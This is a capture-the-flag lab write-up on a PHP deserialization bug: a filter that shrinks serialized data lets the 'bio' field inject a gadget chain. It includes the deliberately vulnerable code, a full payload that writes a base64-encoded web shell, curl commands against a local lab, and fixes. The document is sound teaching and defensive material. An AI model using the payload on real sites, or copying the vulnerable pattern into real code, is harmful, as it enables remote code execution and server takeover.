# 05 — Serialize, Then Replace — Writeup

## TL;DR

`save_profile()` serializes a `Profile` object and *then* runs
`str_replace('../', '', $blob)` over the serialized bytes. Every `../` hidden in
the first property removes 3 bytes from the blob while the `s:<n>:` length
prefix PHP already wrote keeps its pre-filter value. Pad the `nickname` with
exactly `gap / 3` occurrences of `../` and the over-long length swallows the
serialized framing of the next two properties, so the `bio` value is re-parsed
as object structure. `bio` carries a `ThumbnailCache` whose `__destruct()`
stringifies a `RemoteImage`, whose `__toString()` reads a `data://` URI — the
web shell lands in `/var/www/html/thumbs/` and `cat /flag.txt` does the rest.

Flag: `PHRACK{the_length_prefix_swallowed_the_next_property}`

## The bug

### PHP serialization is length-prefixed, not delimited

```php
php > echo serialize(['a' => 'hello']);
a:1:{s:1:"a";s:5:"hello";}
              ^^^^^ the parser trusts this number, not the quotes
```

`unserialize()` does not scan for the closing `"`. For `s:N:"` it reads exactly
`N` bytes and then *asserts* that the next two bytes are `";`. That single
design choice is what turns any byte-level rewrite of a serialized blob into an
object-injection primitive: change the byte count of a string value without
changing its prefix and the parser's cursor lands somewhere the developer never
intended — inside data the attacker controls.

### The vulnerable code

`challenge/src/lib.php`:

```php
function save_profile(Profile $p)
{
    $blob = serialize($p);

    /*
     * Defence in depth: profile fields end up in media paths further down the
     * road, so make sure nothing we persist can be used to walk out of the
     * media directory later on.
     */
    $blob = str_replace('../', '', $blob);

    file_put_contents(profile_file($p->username), $blob);
}
```

and the read side:

```php
function load_profile($username)
{
    $f = profile_file($username);
    if (!is_file($f)) {
        return null;
    }
    return unserialize(file_get_contents($f));
}
```

The sanitiser itself is not wrong — stripping `../` from a path *is* a
reasonable thing to do. It is wrong *here*, because it runs on the serialized
representation rather than on the individual values. Three bytes vanish per
occurrence; nobody updates the length prefix.

This is exactly the shape of the Joomla session bug. `JSessionStorageDatabase`
(Joomla ≤ 3.4.6) stored PHP-serialized session data in MySQL and could not keep
NUL bytes, so it round-tripped them through a printable placeholder:

```php
// libraries/joomla/session/storage/database.php  (Joomla 3.4.6)
// write():
$data   = str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data);
// read():
$result = str_replace('\0\0\0', chr(0) . '*' . chr(0), $result);
```

`chr(0).'*'.chr(0)` is 3 bytes, the literal `\0\0\0` is 6 characters. Writing
grows 3 → 6, reading shrinks 6 → 3: every `\0\0\0` an attacker planted in the
login form made the restored value 3 bytes shorter than declared. Same
primitive, different constant.

### The gadgets

`lib.php` ships two classes used by the avatar cache:

```php
class ThumbnailCache
{
    public $path = null;
    public $data = '';

    public function __destruct()
    {
        if ($this->path !== null) {
            @file_put_contents($this->path, (string) $this->data);
        }
    }
}

class RemoteImage
{
    public $src = '';

    public function __toString()
    {
        $raw = @file_get_contents($this->src);
        return $raw === false ? '' : $raw;
    }
}
```

`ThumbnailCache::__destruct()` is an arbitrary-file-write with a
`(string)` cast on the content, and `RemoteImage::__toString()` is an
arbitrary-stream-read. Chained:

```
unserialize()
  -> ThumbnailCache::__destruct()            (fires at request shutdown)
       -> file_put_contents($path, (string) $data)
            -> RemoteImage::__toString()
                 -> file_get_contents('data://text/plain;base64,...')
```

`/var/www/html/thumbs/` is writable by `www-data` (it is the thumbnail cache)
and is inside the document root, so the write is a PHP file drop.

## Building the exploit

### 1. Which property pads, which property injects

`serialize()` emits properties in **declaration order**:

```php
class Profile {
    public $nickname;   // #1 — attacker controlled  -> padding
    public $username;   // #2 — session controlled
    public $bio;        // #3 — attacker controlled  -> payload
}
```

Because the filter *shrinks*, the corrupted length must reach **forward**. So
the padding goes in the earliest attacker-controlled property (`nickname`) and
the payload in a later one (`bio`).

### 2. The gap

The over-long `nickname` length has to swallow exactly the bytes between the
end of the real nickname value and the first byte of the `bio` value:

```
";s:8:"username";s:<lu>:"<username>";s:3:"bio";s:<lb>:"
```

With `username = "oran"` and a 224-byte bio payload that is

```
";s:8:"username";s:4:"oran";s:3:"bio";s:224:"      -> 45 bytes
```

45 is divisible by 3, so **15** repetitions of `../` do the job. If it were
not divisible by 3 we would simply grow the username by a byte until it is —
that is what `pick_username()` in the solver does, and it is why the exploit
registers a fresh account with a computed name length instead of a fixed one.

### 3. The payload

```
";  s:6:"avatar";  O:14:"ThumbnailCache":2:{ ... }  s:3:"bio";s:5:"pwned
^   ^              ^                                ^
|   |              |                                `- property #3, deliberately
|   |              |                                   left OPEN
|   |              `- property #2: the gadget object (objects are not
|   |                 ';'-terminated in PHP's format)
|   `- a dynamic property name; PHP 8.1 accepts it without a peep
`- closes the over-long nickname string
```

`Profile` declares 3 properties and the header says `O:7:"Profile":3:{`, so
after the giant `nickname` we must supply exactly **two** more name/value pairs
and then a `}`. The trick that makes it fit is leaving the last value open:
the original blob still has `";}` after our `bio` value, which closes
`s:5:"pwned` into `s:5:"pwned";` and then closes the object. Orange's example
in the article does the same thing with `s:8:"realname";s:5:"pwned`.

### 4. Byte-level walkthrough

The profile object before the filter (359 bytes):

```
O:7:"Profile":3:{s:8:"nickname";s:49:"anon../../../../../../../../../../../../../../../";s:8:"username";s:4:"oran";s:3:"bio";s:224:"";s:6:"avatar";O:14:"ThumbnailCache":2:{s:4:"path";s:27:"/var/www/html/thumbs/sh.php";s:4:"data";O:11:"RemoteImage":1:{s:3:"src";s:65:"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==";}}s:3:"bio";s:5:"pwned";}
                                ^^^^ 49 = strlen("anon") + 15 * strlen("../")
```

`str_replace('../', '', $blob)` removes 45 bytes. The stored file (314 bytes):

```
O:7:"Profile":3:{s:8:"nickname";s:49:"anon";s:8:"username";s:4:"oran";s:3:"bio";s:224:"";s:6:"avatar";O:14:"ThumbnailCache":2:{...}s:3:"bio";s:5:"pwned";}
```

and this is how `unserialize()` reads it:

```
 offset  bytes                        what the parser does
 ------  ---------------------------  --------------------------------------------
      0  O:7:"Profile":3:{            object header, 3 properties expected
     17  s:8:"nickname";              property #1 name
     32  s:49:"                       string value, DECLARED LENGTH = 49
 .-  38  anon                         4 real bytes ... 45 to go
 |   42  ";s:8:"username";        -.
 |   59  s:4:"oran";               |  45 bytes of serialized FRAMING, consumed
 |   70  s:3:"bio";                |  as if they were part of the nickname
 |   80  s:224:"                  -'
 `-> 87  ";                           38 + 49 == 87 : the value ends here, and
                                      the parser finds the '";' it requires.
                                      $nickname is now
                                      'anon";s:8:"username";s:4:"oran";s:3:"bio";s:224:"'

     89  s:6:"avatar";                property #2 name  (OURS)
    102  O:14:"ThumbnailCache":2:{     property #2 value: the gadget
             s:4:"path";s:27:"/var/www/html/thumbs/sh.php";
             s:4:"data";O:11:"RemoteImage":1:{
                 s:3:"src";s:65:"data://text/plain;base64,PD9waHAg...";
             }
         }
         s:3:"bio";                   property #3 name  (OURS)
         s:5:"pwned                   property #3 value — OPEN, 5 bytes promised
         ";                           <- these 2 bytes come from the ORIGINAL blob
                                         and close it
         }                            <- and this one closes the object. 3/3. Clean.
```

No warning, no `false` return: `unserialize()` is perfectly happy.

```
Profile Object
(
    [nickname] => anon";s:8:"username";s:4:"oran";s:3:"bio";s:224:"
    [username] =>
    [bio]      => pwned
    [avatar]   => ThumbnailCache Object
        (
            [path] => /var/www/html/thumbs/sh.php
            [data] => RemoteImage Object ( [src] => data://text/plain;base64,... )
        )
)
```

At shutdown `ThumbnailCache::__destruct()` writes
`<?php system($_GET["c"]); ?>` to `/var/www/html/thumbs/sh.php`.

### 5. Reproducing it by hand

```sh
make up

# register
curl -s -c jar http://127.0.0.1:8005/register.php -d 'username=oran&password=x'

# poison (nickname = "anon" + 15 * "../",  bio = the payload above)
curl -s -b jar http://127.0.0.1:8005/profile.php \
  --data-urlencode 'nickname=anon../../../../../../../../../../../../../../../' \
  --data-urlencode 'bio=";s:6:"avatar";O:14:"ThumbnailCache":2:{s:4:"path";s:27:"/var/www/html/thumbs/sh.php";s:4:"data";O:11:"RemoteImage":1:{s:3:"src";s:65:"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==";}}s:3:"bio";s:5:"pwned'

# read it back -> unserialize() -> __destruct()
curl -s -b jar -o /dev/null http://127.0.0.1:8005/profile.php

# collect
curl -s --get http://127.0.0.1:8005/thumbs/sh.php --data-urlencode 'c=cat /flag.txt'
```

## The exploit

`solve/solve.py` (Python 3 stdlib only). Stages:

1. **Serializer primitives** — `s()` and `obj()` emit PHP's format; nothing is
   hardcoded, every length prefix is computed from the string it describes.
2. **Gadget construction** — `ThumbnailCache{path, data: RemoteImage{src}}`,
   with `src` a `data://text/plain;base64,` URI holding the web shell and
   `path` a randomised `.php` name under `thumbs/` (so repeated runs do not
   collide).
3. **`PAYLOAD`** — `'";' + key("avatar") + GADGET + 's:3:"bio";s:5:"pwned'`;
   its length is the `s:<lb>:` prefix PHP will write for the `bio` property,
   which feeds straight back into the gap computation.
4. **`middle(username)`** — builds the exact framing string that has to be
   swallowed, so the gap is *measured*, never guessed.
5. **`pick_username()`** — grows a random username until
   `len(middle(u)) % 3 == 0`. This is the only search in the exploit and it
   terminates in at most three iterations.
6. **Drive it** — register, `POST /profile.php` with
   `nickname = "anon" + "../" * (gap // 3)` and `bio = PAYLOAD`,
   `GET /profile.php` to make `unserialize()` run, then
   `GET /thumbs/<rand>.php?c=cat /flag.txt`.

The script prints the arithmetic it derived before sending anything:

```
[*] bio payload       : 231 bytes (this is the s:231: prefix PHP will write)
[*] username          : ob64 (4 chars)
[*] gap to swallow    : 45 bytes -> '";s:8:"username";s:4:"ob64";s:3:"bio";s:231:"'
[*] filter eats       : 3 bytes per '../'
[*] '../' repetitions : 15  (15 * 3 == 45)
[*] nickname          : 49 bytes declared, 4 bytes after the filter
```

## Fixing it

**Never transform a serialized blob.** The serialized form is an opaque binary
encoding whose framing is byte-exact; anything that changes its length without
re-serializing is a vulnerability, no matter how benign the transformation
looks.

```php
// wrong: the filter sees framing bytes as if they were data
$blob = str_replace('../', '', serialize($p));

// right: sanitise the values, then serialize
$p->nickname = str_replace('../', '', $p->nickname);
$p->bio      = str_replace('../', '', $p->bio);
$blob        = serialize($p);
```

Better still, do not sanitise at all at this layer — validate at the point of
use (`realpath()` + prefix check when building the media path), and do not use
`serialize()` for records that cross a trust boundary:

```php
// 1. a format with no gadget surface
file_put_contents($f, json_encode(['nickname' => ..., 'bio' => ...]));
$data = json_decode(file_get_contents($f), true);

// 2. if you must keep serialize(), pin the classes
$p = unserialize($blob, ['allowed_classes' => [Profile::class]]);

// 3. and make tampering detectable
$mac = hash_hmac('sha256', $blob, $key);
```

`allowed_classes` alone would have stopped this exact chain (PHP 7.0+): the
injected `ThumbnailCache` would have come back as `__PHP_Incomplete_Class`,
which has no `__destruct()`.

Joomla's own fix, for reference, was to stop storing raw serialized session
data: from 3.4.7 the blob is base64-encoded before it reaches the replace, so
no length skew survives.

## Going further

* **The other direction — a filter that grows.** 0CTF 2016 `piapiapia` used
  `preg_replace('/select|insert|update|delete|where/i', 'hacker', $blob)` after
  `serialize()`. `where` (5) → `hacker` (6) is **+1 byte** per occurrence, so
  the real value ends up *longer* than declared and the parser stops **early**,
  inside the same string. The payload therefore sits at the **tail of the same
  field**, not in a later one:

  ```
  declared: s:288:"
  content:  hackerhackerhacker...hacker  ";}s:5:"photo";s:24:"/var/www/html/config.php";}
            \_____ 288 bytes of it ____/  ^
                                          `- the parser stops here and resumes parsing
  ```

  Repeat the trigger word `strlen($payload)` times and the 1-byte-per-word
  drift moves the cursor to exactly the start of the payload — no modular
  arithmetic needed, which is why that challenge's exploit is a one-liner.
  `piapiapia` also needed an array-type-confusion bypass
  (`nickname[]=...` makes `preg_match()` return `false` and `strlen()` return
  `NULL`) to get its bytes past the input validation in the first place.

* **No gadget at all.** `piapiapia` never instantiated an object: it simply
  rewrote the array key `photo` to `/var/www/html/config.php`, and the
  application's own `file_get_contents($profile['photo'])` leaked the file.
  Redirecting a benign key is often enough — look for one before hunting POP
  chains.

* **Make it harder.** Drop the `data://` wrapper (`allow_url_fopen=0`), cap the
  nickname at 32 bytes so the padding has to live somewhere else, or move the
  payload into an array element so the gap crosses `a:N:{i:0;`.

* **Lab 06** in this repo is the same primitive with a 65-byte shrink constant
  that the application produces *for you*, in current WordPress.

## References

* Orange Tsai, *"The Art of PHP - My CTF Journey and Untold Stories!"*,
  Phrack #72, chapter 2.1 — the source of this lab.
* 0CTF 2016 Quals, `piapiapia` — <https://ctftime.org/task/2130>.
  Writeups: p4 team
  <https://github.com/p4-team/ctf/blob/master/2016-03-12-0ctf/piapiapia/README.md>,
  sixstars
  <https://github.com/sixstars/ctf/blob/master/2016/0ctf/web/piapiapia/README.md>
* Alessandro "kiks" Groppo, *"Rusty Joomla Remote Code Execution"* (2019-10-03)
  — <https://www.hacktivesecurity.com/blog/2019/10/03/rusty-joomla-rce/>,
  PoC <https://www.exploit-db.com/exploits/47465>,
  <https://github.com/kiks7/rusty_joomla_rce>
* Joomla 3.4.6 session storage —
  <https://github.com/joomla/joomla-cms/blob/3.4.6/libraries/joomla/session/storage/database.php>
* Stefan Esser, *"Shocking News in PHP Exploitation"* — the original
  presentation of PHP Object Injection.
* PHP manual, `unserialize()` and the `allowed_classes` option —
  <https://www.php.net/manual/en/function.unserialize.php>
